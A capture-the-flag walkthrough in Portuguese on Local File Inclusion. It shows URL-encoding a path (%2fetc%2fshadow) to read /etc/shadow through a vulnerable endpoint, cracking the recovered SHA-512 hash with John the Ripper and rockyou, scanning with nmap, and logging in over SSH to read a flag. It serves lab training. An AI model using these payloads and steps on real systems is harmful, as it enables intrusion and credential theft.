# _**Contexto de LFI (Local File Inclusion)**_
Algumas aplicações web incluem o conteúdo de outros arquivos e o imprimem em uma página web  
Ou a aplicação pode incluí-lo no documento e analisá-lo como parte da respectiva linguagem
Por exemplo, se uma aplicação web tiver a seguinte requisição: ```https://example.com/?include_file=file1.php```  
Isso pegaria o conteúdo de file1.php e o exibiria na página  
Se uma aplicação não colocar na lista de permissões quais arquivos podem ser incluídos, um usuário poderá requisitar o arquivo _/etc/shadow_, mostrando todas as senhas com hash dos usuários no sistema que executa a aplicação web

Quando a aplicação web inclui um arquivo, ela o lerá com as permissões do usuário que executa o servidor web  
Por exemplo, se o usuário joe executar o servidor web, ele lerá o arquivo com as permissões de joe
Se estiver executando como _root_, ele terá as permissões de usuário root  
Leve isso em consideração ao tentar incluir arquivos: tente primeiro incluir um arquivo que você sabe que o servidor web tem permissão de leitura para verificar se ele é vulnerável à inclusão de outros arquivos  
Com a inclusão de arquivos locais, você pode tentar visualizar os seguintes arquivos para ajudar a assumir o controle de uma máquina  

Alguns servidores web interpretam cada barra (/) como uma requisição para um novo diretório. Mas e se quisermos incluir um arquivo como _/etc/shadow?_
Considere a seguinte requisição: ```https://example.com/notes/?include=/etc/shadow```  
O servidor pensará que está indo para /notes/include/etc/shadow. Você não pode incluir uma barra na URL, pois o servidor web pensará que está fazendo uma requisição para um diretório diferente.
A solução é usar a codificação de URL  

A codificação de URL substitui caracteres ASCII inseguros por '%' seguido por dois dígitos hexadecimais  
Uma barra (/) pode ser codificada como %2F  
Isso significa que podemos alterar a requisição que tínhamos anteriormente para: ```https://example.com/notes/?include=%2Fetc%2Fshadow```
Esta nova requisição será feita para _/notes/_ e então converterá %2F em uma barra!  
Removendo qualquer ambiguidade sobre onde a solicitação é feita e o arquivo que estamos incluindo  
Este é um [decodificador/codificador](https://meyerweb.com/eric/tools/dencoder/) de URL útil que você pode usar  

# _**Execução**_
Inspecionando o código-fonte da página, encontra-se o código abaixo

> ```bash
>  function getNote(note, id) {
>    const url = '/get-file/' + note.replace(/\//g, '%2f')
>    $.getJSON(url,  function(data) {
>      document.querySelector(id).innerHTML = data.info.replace(/(?:\r\n|\r|\n)/g, '<br>');
>    })
>  }
>  // getNote('server.js', '#note-1')
>  getNote('views/notes/note1.txt', '#note-1')
>  getNote('views/notes/note2.txt', '#note-2')
>  getNote('views/notes/note3.txt', '#note-3')
> ```

Se o backend simplesmente decodificar o valor e fizer algo como: ```fs.readFile(decodeURIComponent(req.params.filename), ...)```  
Então um atacante pode chamar: ```/get-file/%2fetc%2fshadow```
E o servidor leria /etc/shadow diretamente, revelando dados sensíveis  
Conseguindo acesso ao arquivo /etc/shadow, temos o usuário charlie e seu hash  
Estrutura de um arquivo _/etc/shadow_: <mark>usuário:senha:lastchg:min:max:warn:inactive:expire:reserved</mark>  

Hash da senha: <mark>$6$oHymLspP$wTqsTmpPkz.u/CQDbheQjwwjyYoVN2rOm6CDu0KDeq8mN4pqzuna7OX.LPdDPCkPj7O9TB0rvWfCzpEkGOyhL</mark>  
**Algoritmo usado:** ($6$) | sha-512  
**Salt usado:** oHymLspP  

Utilizando a ferramenta <mark>John the Ripper</mark> e a lista de senhas **rockyou** para quebrar a senha
> ```bash
> john --wordlist=../wordlists/rockyou.txt hashes.txt
> ```

<mark>Senha: password1</mark>  
Agora, verifica-se que tipo de conexão ou aplicativo está rodando na máquina com a ferramenta nmap  
> ```bash
> nmap -p 0-10000 -sV -A -T5 [ip_address]
> ```
> ```bash
> port 22: ssh
> ```

Uma conexão ssh com o usuário e senha descoberto  
> ```bash
> ssh charlie@[ip_address]
> ```
password: password1  
Acesso garantido!  

Um simples ```ls``` e vemos o arquivo flag1.txt
```cat flag1.txt``` e temos o seu conteúdo

Para os outros desafios, o primeiro basta olhar o próprio site
O segundo é a senha descoberta
